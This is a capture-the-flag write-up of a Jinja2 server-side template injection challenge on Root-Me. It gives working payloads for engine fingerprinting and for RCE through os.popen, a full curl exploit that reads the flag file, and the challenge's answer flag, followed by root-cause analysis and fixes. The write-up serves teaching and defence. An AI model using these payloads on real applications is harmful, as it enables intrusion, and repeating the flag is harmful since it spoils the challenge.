# Root-Me — Web-Server / Python - Server-side Template Injection Introduction (ch74)

- **Target:** http://challenge01.root-me.org/web-serveur/ch74/ → redirects to **http://challenge01.root-me.org:59074/**
- **Class:** SSTI — Jinja2 template injection leading to RCE
- **Author / date:** Podalirius, 7 September 2021
- **Goal:** use the page-generation service to read the flag

## Flag (validation password)

```
Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!
```

Byte-exact (`repr` of the file contents, 50 bytes total — 49 chars + a trailing newline):

```
b'Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n'
```

Submit the trimmed string; the `.passwd` file carries a trailing `\n`.

## The application

`/` serves a form that POSTs `title` and `content` to `/preview`. The response is **JSON**:

```json
{"content": "49", "title": "TITLEHERE"}
```

Server banner: `Werkzeug/1.0.1 Python/3.8.10` — Flask + Jinja2.

The source is readable from the shell we obtain, and it is unambiguous:

```python
@app.route("/preview", methods=['GET','POST'])
def preview():
    if request.method == "POST":
        if "title" in request.form.keys() and len(request.form["title"]) != 0 and \
           "content" in request.form.keys() and len(request.form["content"]) != 0:
            if len(request.form["title"]) > 20:
                return {'error':"Field 'title' is too long."}
            if len(request.form["content"]) > 512:
                return {'error':"Field 'content' is too long."}
            return {
                'title':   request.form["title"],
                'content': jinja2.Template(request.form["content"]).render()   # <-- SSTI
            }
```

`jinja2.Template(user_input).render()` compiles and executes attacker-supplied template
source. The `title` field is returned as-is; only `content` is templated.

Constraints: `title` ≤ 20 chars, `content` ≤ 512 chars — plenty for a payload.

## Step 1 — Confirm SSTI and fingerprint the engine

| Payload | Response | Reading |
|---|---|---|
| `{{7*7}}` | `49` | **templated** |
| `{{7*'7'}}` | `7777777` | **Jinja2 / Python** (Twig would give `49`) |
| `{7*7}` | `{7*7}` | single braces are literal |
| `${7*7}` | `${7*7}` | not a JS/JSP engine |
| `#{7*7}` | `#{7*7}` | not Ruby |

The `7*'7'` result is the decisive engine fingerprint: string repetition is Python
semantics, so this is Jinja2, not Twig/Smarty.

## Step 2 — Reach a shell

Jinja2's default globals expose Python objects whose `__globals__` contain the `os` module.
`cycler`, `lipsum`, `joiner`, and `namespace` are all injected by Jinja2 by default:

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

→ `uid=1043(web-serveur-ch74) gid=1043(web-serveur-ch74) groupes=1043(web-serveur-ch74),100(users)`

Confirmed working alternatives (same idea):

```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}     # class-walk route, if globals are stripped
```

## Step 3 — Locate and read the flag

```jinja2
{{ cycler.__init__.__globals__.os.popen('pwd; ls -la').read() }}
```

```
/challenge/web-serveur/ch74
-r--------  1 web-serveur-ch74 web-serveur-ch74   50  .passwd
-r-xr-x---  1 web-serveur-ch74 web-serveur-ch74 1376  server_ch74.py
```

The process runs as `web-serveur-ch74`, which **owns** `.passwd` (mode `0400`), so it is
readable. `server_ch74.py` is readable too — that is where the vulnerable line came from.

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat .passwd').read() }}
```

→ `Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!`

## Full exploit

```bash
curl -s -X POST http://challenge01.root-me.org:59074/preview \
  --data-urlencode "title=t" \
  --data-urlencode "content={{ cycler.__init__.__globals__.os.popen('cat .passwd').read() }}" \
  --data-urlencode "button=1"
# -> {"content":"Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n","title":"t"}
```

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | `{7*7}` / `${7*7}` / `#{7*7}` | not template syntax | echoed literally |
| 2 | `title={{7*7}}`, `content=plain` | title not templated | `content: "plain"` |
| 3 | `title=t`, `content={{7*7}}` | content templated | `content: "49"` |
| 4 | empty `content` | rejected | redirect to the form (404 page) |
| 5 | `content` of 513 chars | rejected | `Field 'content' is too long.` |
| 6 | `title` of 21 chars | rejected | `Field 'title' is too long.` |
| 7 | `{{ ... os.popen('cat /etc/hostname').read() }}` | runs, different output | `challenge01` |

Controls 1–3 pin the injection to the `content` field and to `{{ }}` delimiters rather than
`${ }`/`#{ }`, and control 7 shows the shell is genuinely executing arbitrary commands
rather than echoing a canned string. Controls 4–6 confirm the length validation is a
separate, working mechanism — it simply does not constrain the payload.

## Root cause

1. **User input compiled as template source.** `jinja2.Template(request.form["content"]).render()`
   is the whole bug. Template *source* must never come from a request; only template
   *variables* may.
2. **Jinja2's default globals are reachable.** `cycler`/`lipsum`/`joiner` ship with every
   Jinja2 environment, and their `__init__.__globals__` exposes the importing module's
   globals — including `os`. That turns expression evaluation into command execution.
3. **No sandbox.** `jinja2.Template` is the un-sandboxed class. `SandboxedEnvironment` would
   at least block attribute traversal into `__globals__` (though sandbox escapes exist).
4. **The flag is a readable file owned by the service account.** Mode `0400` protects it from
   other users but not from the process itself, so any code-execution primitive wins outright.
5. **Source and secrets are colocated** with the app and readable by its uid.

## Fix

- **Never build templates from user input.** Pass data *into* a fixed template instead:

  ```python
  # safe: template is static, user data is a variable
  return render_template("preview.html", title=title, content=content)
  ```

  If you genuinely need user-authored templates, that is a product decision with a security
  cost — treat it as untrusted code execution and isolate it (separate process, no secrets,
  no filesystem).

- **Use `SandboxedEnvironment`** if dynamic templates are unavoidable:

  ```python
  from jinja2.sandbox import SandboxedEnvironment
  env = SandboxedEnvironment()
  return {"content": env.from_string(user_content).render()}
  ```

  This blocks `__globals__`/`__subclasses__` traversal by default. It is a mitigation, not a
  guarantee — sandbox escapes are found regularly — so keep secrets and privileges out of
  reach anyway.

- **Drop privileges and sandbox the process.** Run the renderer as a user with no access to
  the flag, in a container with a read-only filesystem and no `os`-reachable secrets.
- **Move the secret out of the web root** and out of the service account's reach (env var
  injected at runtime, or a secrets manager). Store a hash if the value is only ever
  compared, not displayed.
- **Return generic errors** — the 500 on `{{config.items()}}` and the JSON shape told me a
  lot about the stack.

## Generalisation

SSTI is "SQL injection for template engines" — the same trust-boundary mistake, in a place
that usually has *more* privileges than the database. The pattern to grep for:

- `Template(user_input)`, `render_template_string(request.…)`, `from_string(user_input)`
- Twig `createTemplate()`, Smarty `eval`, Velocity, Handlebars `compile()`, ERB `ERB.new`
- Anything that takes a string from a request and calls it a template

Engine fingerprinting before payload-building is worth the two requests:

| Probe | Jinja2 (Python) | Twig (PHP) | Handlebars |
|---|---|---|---|
| `{{7*7}}` | `49` | `49` | `49` |
| `{{7*'7'}}` | `7777777` | `49` | error |

And the generic RCE route in Jinja2 is always "get from a template expression to a Python
module that exposes `os`": `cycler`/`lipsum`/`joiner`/`namespace` → `__init__.__globals__`
→ `os`/`subprocess`, or the class-walk `''.__class__.__mro__[1].__subclasses__()`. The
length limit on this challenge (512 chars) is not a meaningful barrier — the payload above
is 66 characters.
